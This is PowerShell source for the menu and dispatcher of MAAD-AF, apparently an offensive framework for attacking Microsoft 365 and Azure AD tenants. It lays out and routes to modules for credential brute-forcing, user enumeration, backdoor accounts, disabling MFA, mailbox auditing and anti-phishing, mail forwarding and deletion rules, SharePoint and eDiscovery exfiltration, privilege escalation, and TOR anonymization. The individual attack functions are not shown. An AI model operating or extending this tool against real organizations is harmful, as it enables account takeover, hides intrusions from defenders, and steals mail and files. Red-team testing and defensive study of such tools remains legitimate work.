function MAADAttackArsenal{
    $maad_attack_menu = 
    [ordered]@{
        "Pre-Attack" = @{1 = "Find Tenant ID of Organization"; 2 = "Find DNS Info"; 3 = "Recon User Login Info"; 4 = "Check account validaity in target tenant"; 5 = "Enumerate users to find valid users in tenant"; 6 = "Brute-Force Credentials"};
        "Access" = @{1 = "Show Available Credentials"; 2 = "Add Credentials"; 3 = "Establish Access - All"; 4 = "Establish Access - AzureAD"; 5= "Establish Access - Az"; 6 = "Establish Access - Exchange Online"; 7 = "Establish Access - Teams"; 8 = "Establish Access - Msol"; 9 = "Establish Access - Sharepoint Site"; 10 = "Establish Access - Sharepoint Admin Center"; 11 = "Establish Access - Compliance (eDiscovery)"; 12 = "Kill All Access"; 13 = "Anonymize Access with TOR"};
        "Recon" = @{1 = "AAD : Find All Accounts"; 2= "AAD : Find All Groups"; 3 = "AAD : Find All Service Principals"; 4 = "AAD : Find All Auth Policy"; 5 = "AAD : Recon Named Locations"; 6 = "AAD : Recon Conditional Access Policy"; 7 = "AAD : Recon Registered Devices for Account"; 8 = "AAD : Recon All Accessible Tenants"; 9 = "AAD : Recon Account Group Roles"; 10 = "Teams : Recon All Teams"; 11 = "SP : Recon All Sharepoint Sites"; 12 = "Exchange : Find All Mailboxes"};
        "Account" = @{1 = "List Accounts in Tenant"; 2 = "Deploy Backdoor Account"; 3 = "Assign Azure AD Role to Account"; 4 = "Assign Management Role Account"; 5 = "Reset Password"; 6 = "Brute-Force Credentials"; 7 = "Disable Account MFA"; 8 = "Delete User"}; 
        "Group" = @{1 = "List Groups in Tenant"; 2 = "Create Group"; 3 = "Add user to Group"; 4 = "Assign Role to Group"};
        "Application" = @{1 = "List Applications in Tenant"; 2 = "Create Application"; 3 = "Generate new Application Credentials"};
        "AzureAD" = @{1 = "Modify Trusted IP Config"; 2 = "Download All Account List"; 3 = "Exploit Cross Tenant Sync"};
        "Exchange" = @{1 = "List Mailboxes in Tenant"; 2 = "Gain Access to Another Mailbox"; 3 = "Setup Email Forwarding"; 4 = "Setup Email Deletion Rule"; 5 = "Disable Mailbox Auditing"; 6 = "Disable Anti-Phishing Policy"};
        "Teams" = @{1 = "List Teams in Tenant"; 2 = "Invite External User to Teams"};
        "Sharepoint" = @{1 = "List Sharepoint Sites"; 2 = "Gain Access to Sharepoint Site"; 3 = "Search Files in Sharepoint"; 4= "Exfiltrate Data from Sharepoint"};
        "Compliance" = @{1 = "Launch New eDiscovery Search"; 2 = "Recon Existing eDiscovery Cases"; 3= "Recon Existing eDiscovery Searches"; 4 = "Find eDiscovery Search Details"; 5 = "Find eDiscovery Case Members"; 6 = "Exfil Data with eDiscovery"; 7 = "Escalate eDiscovery Privileges"; 8 ="Install Unified Export Tool"};
        "MAAD-AF" = @{1 = "Set MAAD-AF TOR Configuration"; 2 = "Set Dependency Check Default Setting"; 3 = "Reset & Disable Local Host Proxy Settings"; 4 = "Launch New MAAD-AF Session"};
        "Exit" = @{1 = "Exit - Close all connections"; 2 = "Exit - Keep all connections"}
    }

    while ($true){
        Write-Host ""

        MainMenu "MAAD Attack Arsenal" $maad_attack_menu

        try {
            $execution_choice = $null
            $main_module_user_choice = (Read-Host -Prompt "`nSelect an option from the Arsenal:").Trim().ToUpper()
            
            ###Users can type "keywords" to quickly take actions or retrieve certain information
            ###MAAD Special Commands for quick actions
            switch ($main_module_user_choice){
                "SHOW ALL" {MainMenuExpanded "Attack Arsenal" $maad_attack_menu}
                "SHOW CREDS" {RetrieveCredentials}
                "ADD CREDS" {$execution_choice = "Access.2"}
                "ESTABLISH ACCESS" {EstablishAccess}
                "SWITCH ACCESS" {EstablishAccess}
                "ACCESS INFO" {AccessInfo}
                "KILL ACCESS" {terminate_connection}
                "ANONYMIZE" {TORAnonymizer("start")}
                "EXIT" {exit}
                "FULL EXIT" {terminate_connection;exit}
                "HELP" {MAADHelp} 
            }

            if ($null -eq $execution_choice){
                if ($main_module_user_choice -ne 0 -and $main_module_user_choice -in $maad_attack_menu.Keys) {
                    $main_module_selection = ($maad_attack_menu.$main_module_user_choice)
                    OptionDisplay "$main_module_user_choice" $main_module_selection

                    [int]$module_choice = Read-Host "`nSelect a $main_module_user_choice module"

                    $execution_choice = $main_module_user_choice +'.'+ [string]$module_choice
                }
            }
            
            switch ($execution_choice){
                "Pre-attack.1" {MAADReconTenantID}
                "Pre-attack.2" {MAADReconDNSInfo}
                "Pre-attack.3" {MAADUserLoginInfo}
                "Pre-attack.4" {MAADCheckUserValidity}
                "Pre-attack.5" {MAADEnumerateValidUsers}
                "Pre-attack.6" {ExternalBruteForce}

                "Access.1" {RetrieveCredentials}
                "Access.2" {
                    $new_cred_id = Read-Host -Prompt "`nCredential Identifier"
                    $new_cred_type = Read-Host -Prompt "`nSelect Cred Type? [password / token]"
                    if ($new_cred_type -eq "password"){
                        $new_username = Read-Host -Prompt "`nUsername"
                        $new_password = Read-Host -Prompt "`nPassword"
                        AddCredentials $new_cred_type $new_cred_id $new_username $new_password 
                    }
                    elseif ($new_cred_type -eq "token"){
                        Read-Host -Prompt "`nToken"
                        AddCredentials $new_cred_type, $new_cred_id $new_token
                    }
                }
                "Access.3" {EstablishAccess}
                "Access.4" {EstablishAccess "azure_ad"}
                "Access.5" {EstablishAccess "az"}
                "Access.6" {EstablishAccess "exchange_online"}
                "Access.7" {EstablishAccess "teams"}
                "Access.8" {EstablishAccess "msol"}
                "Access.9" {EstablishAccess "sharepoint_site"}
                "Access.10" {EstablishAccess "sharepoint_admin_center"}
                "Access.11" {EstablishAccess "ediscovery"}
                "Access.12" {terminate_connection}
                "Access.13" {TORAnonymizer("start")}

                "Recon.1" {MAADGetAllAADUsers}
                "Recon.2" {MAADGetAllAADGroups}
                "Recon.3" {MAADGetAllServicePrincipal}
                "Recon.4" {ListAuthorizationPolicy}
                "Recon.5" {MAADGetNamedLocations}
                "Recon.6" {MAADGetConditionalAccessPolicies}
                "Recon.7" {MAADGetRegisteredDevices}
                "Recon.8" {MAADGetAccessibleTenants}
                "Recon.9" {MAADGetAccountGroupRoles}
                "Recon.10" {MAADGetAllTeams}
                "Recon.11" {MAADGetAllSharepointSites}
                "Recon.12" {MAADGetAllMailboxes}
                
                "Account.1" {MAADGetAllAADUsers}
                "Account.2" {CreateAccount}
                "Account.3" {AssignRole "account"}
                "Account.4" {AssignManagementRole}
                "Account.5" {ResetPassword}
                "Account.6" {InternalBruteForce}
                "Account.7" {DisableMFA}
                "Account.8" {RemoveAccess}

                "Group.1" {MAADGetAllAADGroups}
                "Group.2" {CreateNewAzureADGroup}
                "Group.3" {AddObjectToGroup}
                "Group.4" {AssignRole "group"}

                "Application.1" {MAADGetAllServicePrincipal}
                "Application.2" {CreateNewAzureADApplication}
                "Application.3" {GenerateNewApplicationCredentials}
                
                "AzureAD.1" {ModifyTrustedNetworkConfig}
                "AzureAD.2" {MAADGetAllAADUsers $true}
                "AzureAD.3" {ExploitCTS}

                "Exchange.1" {MAADGetAllMailboxes}
                "Exchange.2" {GrantMailboxAccess}
                "Exchange.3" {MailForwarding}
                "Exchange.4" {MailboxDeleteRuleSetup}
                "Exchange.5" {DisableMailboxAuditing}
                "Exchange.6" {DisableAntiPhishing}

                "Teams.1" {MAADGetAllTeams}
                "Teams.2" {ExternalTeamsInvite}

                "Sharepoint.1" {MAADGetAllSharepointSites}
                "Sharepoint.2" {GrantAccessToSharpointSite}
                "Sharepoint.3" {SearchSharepointSite}
                "Sharepoint.4" {ExfilDataFromSharepointSite}

                "Compliance.1" {Create_New_Search}
                "Compliance.2" {Display_E_Discovery_Cases}
                "Compliance.3" {
                    Display_E_Discovery_Cases $true
                    if ($null -ne $global:selected_case){
                        Display_E_Discovery_Case_Searches $false $global:selected_case
                    }
                }
                "Compliance.4" {
                    #Find Details of a Search
                    Display_E_Discovery_Cases $true
                    
                    if ($null -ne $global:selected_case){
                        Display_E_Discovery_Case_Searches $true $global:selected_case
                    
                        $export_name = $global:selected_search + "_Export"

                        Get-ComplianceSearch -Identity $global:selected_search

                        try {
                            Get-ComplianceSearchAction -Case $global:selected_case -Identity $export_name -IncludeCredential -Details -ErrorAction Stop
                        }
                        catch {
                            Write-Host "No action for this search has been created yet. Use MAAD's E-Discovery export module if you wish to export contents of this search!!!"
                        }
                    }  
                }
                "Compliance.5" {
                    Display_E_Discovery_Cases $true
                    if ($null -ne $global:selected_case){
                        Get-ComplianceCaseMember -Case $global:selected_case -ShowCaseAdmin
                    }
                }
                "Compliance.6" {EDiscoveryExfil}
                "Compliance.7" {E_Discovery_Priv_Esc}
                "Compliance.8" {Install_Unified_Export_Tool}

                "MAAD-AF.1" {ModifyMAADTORConfig}
                "MAAD-AF.2" {ModifyMAADDependencyCheck}
                "MAAD-AF.3" {DisableHostProxy}
                "MAAD-AF.4" {invoke-expression 'cmd /c start powershell -NoExit -Command  {. .\MAAD_Attack.ps1 -ForceBypassDependencyCheck}'}

                "Exit.1" {
                    terminate_connection
                    if ($global:tor_proxy = $true) {
                        TORAnonymizer("stop")
                    }
                    Write-Host "Exiting tool!!!"
                    exit
                }
                "Exit.2" {exit}
            }
        }
        catch {
            #Do nothing
        }
    }
}

function MainMenu ($menu_message, $maad_attack_menu){
    ###This function diplays MAAD-AF main menu
    DisplayCentre "##########################" "Red"
    DisplayCentre $menu_message "Red"
    DisplayCentre "##########################" "Red"
    $option_list_array = $maad_attack_menu.GetEnumerator()

    $option_number = 1
    foreach ($item in $option_list_array){
        Write-Host "# $($item.Name)" -ForegroundColor Red
        # $option_sub_list_array = ($item.Value).GetEnumerator() | sort Name
        $option_number += 1
    } 
    #Adding extra menu (without sub-menu) options
    Write-Host "# Help" -ForegroundColor Red
}

function MainMenuExpanded ($menu_message, $maad_attack_menu){
    $option_list_array = $maad_attack_menu.GetEnumerator()

    #Get longest options length and add 1 for extra space
    $max_option_item_length = ($maad_attack_menu.Values |ForEach-Object { $_.values} |ForEach-Object {$_.length} | Measure-Object -Maximum).Maximum + 1

    Write-Host ""
    foreach ($item in $option_list_array){
        #Display Top category name
        Write-Host $item.Name ":" -ForegroundColor Red
        $option_sub_list_array = ($item.Value).GetEnumerator() | sort Name
        foreach ($sub_item in $option_sub_list_array){
            #Display category options with option trigger number
            $extra_space = ($max_option_item_length - $sub_item.Value.length)
            Write-Host "    $($sub_item.Name) : $($sub_item.Value +' '*$extra_space)"
        }
        Write-Host ""
    } 
}

